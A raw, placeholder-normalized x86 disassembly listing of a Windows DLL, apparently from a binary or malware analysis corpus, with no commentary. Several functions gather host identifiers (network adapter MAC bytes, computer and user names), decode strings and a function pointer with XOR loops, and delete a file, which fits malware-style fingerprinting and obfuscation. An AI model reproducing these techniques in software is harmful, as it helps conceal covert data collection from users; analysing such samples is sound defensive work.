mov ecx [ ebp - 0x458 ]
push ecx
call sub_100187af
add esp 0x4
mov esi [ ebp - 0x498 ]
xor ecx ecx
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x47c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] ax
call sub_1006a530
xor eax eax
mov edx [ ebp - 0x47c ]
push edx
call sub_100187af
add esp 0x4
xor ecx ecx
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
call sub_1006a530
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0x47c ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
sub_10039260
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ GetAdaptersInfo@IAT ]
push edi
mov edi ecx
lea ecx [ ebp - 0x4c ]
push ecx
push 0x0
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] 0x0
call ebx
cmp eax 0x6f
je r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ edi ]
push esi
push edx
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x4c ]
push ecx
push esi
call ebx
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0xc ]
mov eax 0x2
mov ebx esi
call sub_1004e680
mov edi [ lstrcmpA@IAT ]
mov edi edi
mov edx [ edi ]
push esi
push 0x0
push edx
call [ HeapFree@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x48 ]
mov eax 0x17
call sub_10049e00
movzx edx [ ebx + 0x199 ]
movzx eax [ ebx + 0x198 ]
movzx ecx [ ebx + 0x197 ]
push edx
movzx edx [ ebx + 0x196 ]
push eax
movzx eax [ ebx + 0x195 ]
push ecx
movzx ecx [ ebx + 0x194 ]
mov ebx [ ebp - 0x54 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx 0x12
call sub_1002cb70
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
add esp 0x1c
push esi
push 0x0
push ecx
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebx + 0x1d8 ]
push ecx
call edi
test eax eax
je r-xdata
sub_100393b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1001caa1
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x18
sub_10039420
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10054c70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1003944a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_10066a1a
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_100814a2
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1002fb6b
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_100814a2
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10039510
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov edi [ rw-data ]
mov [ ebp - 0x24 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x104
push esi
lea eax [ edi + 0x124 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
mov [ ebp - 0x1c ] esi
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ edi + 0x73c ]
push edx
call [ GetComputerNameW@IAT ]
mov [ ebp - 0x20 ] ebx
mov eax [ edi + 0x8 ]
cmp eax 0x6
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp eax 0x5
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
mov [ edi + 0xd54 ] ecx
mov [ ebp - 0x1c ] esi
lea edx [ ebp - 0x1c ]
push edx
lea eax [ edi + 0x944 ]
push eax
call [ GetUserNameW@IAT ]
call sub_100358b0
mov [ edi + 0xd58 ] eax
lea ecx [ edi + 0xb4c ]
call sub_1005d090
lea ecx [ edi + 0xd7c ]
push ecx
mov ecx edi
call sub_10039260
lea ecx [ edi + 0xd5c ]
call sub_10058cd0
mov [ edi + 0x11b4 ] 0x1
jmp r-xdata
cmp [ edi + 0xc ] 0x1
jbe r-xdata
sub_10039630
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov esi ecx
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
push edi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
cmp [ ebp - 0x4 ] edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
cmp eax ecx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x4 ] eax
ja r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax ecx
mov ecx [ ebx ]
call sub_100123b0
mov edi [ esi + 0x4 ]
add esp 0x4
call sub_100699f0
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
mov ecx [ esi ]
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
lea eax [ eax + eax * 8 ]
lea edx [ ecx + eax * 4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10059390
mov edi [ esi + 0x4 ]
add esp 0x8
mov ebx eax
call sub_100699f0
pop edi
mov [ esi + 0x4 ] ebx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov edx [ ebx ]
lea eax [ edi + edi * 8 ]
lea edi [ edx + eax * 4 ]
mov eax ecx
push edi
mov ecx edx
call sub_100123b0
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ebx [ ebx + 0x4 ]
push ecx
push eax
push ebx
mov ecx edi
call sub_10008a60
add esp 0x10
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
call sub_1005b920
test al al
je r-xdata
mov edi [ esi + 0x4 ]
mov eax ecx
call sub_100699f0
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
push edi
push eax
push edx
call sub_10008a60
add esp 0xc
mov [ esi + 0x4 ] eax
sub_10039795
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_10012bb9
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1002d8ee
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_10039a80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
mov eax [ esi * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
mov bl 0x38
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
mov ecx [ ebp - 0x4 ]
lea edx [ esi - 0x1 ]
mov [ ebp - 0x4 ] ecx
cmp edx 0x11
ja r-xdata
cmp esi 0x6
je r-xdata
lea eax [ ebp - 0x4 ]
lea ecx [ ebp + 0x8 ]
call sub_1004a360
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
call [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
sub_10039af0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087a56
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx esi
call [ r--data ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] 0x0
mov [ esi + 0x94 ] cx
call sub_10054c70
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x94 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
mov eax [ eax ]
sub_10039ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086627
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
mov esi [ LocalFree@IAT ]
mov [ ebx ] edi
cmp eax edi
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax edi
je r-xdata
push eax
call esi
mov eax [ ebx + 0x14 ]
dec eax
mov [ ebx + 0x8 ] edi
cmp eax 0x5
ja r-xdata
push eax
call esi
mov [ ebx + 0x14 ] edi
mov [ ebp - 0x4 ] 0x3
mov eax [ ebx + 0x3c ]
dec [ eax ]
mov eax [ eax ]
cmp eax edi
jne r-xdata
jmp [ eax * 4 + jump_table_10039df8 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx + 0x34 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx edi
je r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10022780
mov eax esi
push eax
lea edi [ ebx + 0x18 ]
mov [ ebp - 0x4 ] 0x5
call sub_1002cc00
mov edi esi
mov [ ebp - 0x4 ] 0x4
call sub_1004b790
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10022780
lea edi [ ebx + 0x20 ]
mov ebx esi
call sub_100066f0
mov edi esi
call sub_1004cac0
mov ebx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10022780
lea esi [ ebx + 0x28 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call sub_1006f350
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_100524c0
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10022780
lea esi [ ebx + 0x30 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x7
call sub_1006f350
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_100524c0
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10022780
lea esi [ ebx + 0x38 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x8
call sub_1006f350
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_100524c0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x2c ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x3c ]
mov [ ebx + 0x38 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edi edi
mov eax [ ebx + 0x24 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x28 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x34 ]
mov [ ebx + 0x30 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x3c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x1c ]
dec [ eax ]
jne r-xdata
mov esi [ ebx + 0x20 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ ebx + 0x28 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x34 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebx + 0x18 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x20 ] edi
cmp eax edi
je r-xdata
call sub_10055530
mov [ ebx + 0x2c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x18 ] edi
cmp eax edi
je r-xdata
mov eax esi
call sub_1001f5f0
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x24 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x1c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10039e10
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x20
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000aa4a
jmp r-xdata
sub_10039ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_100874a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x19c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ r--data ]
mov edi ecx
xor ebx ebx
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ esi + eax ]
xor dl cl
xor dl 0xfe
inc cl
mov [ ebp + eax - 0xb8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb8 ]
mov [ ebp - 0xb2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea edx [ ebp - 0x154 ]
lea ecx [ edi + 0xf0 ]
push edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x174 ] ecx
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax [ ebp - 0x154 ]
push eax
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x74
inc cl
mov [ ebp + eax - 0x70 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x6d
inc cl
mov [ ebp + eax - 0xc8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov [ ebp - 0xc2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x2
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x8e
inc cl
mov [ ebp + eax - 0x80 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x3
call sub_100553e0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x81
inc cl
mov [ ebp + eax - 0x48 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10037e00
lea ecx [ ebp - 0x154 ]
push ecx
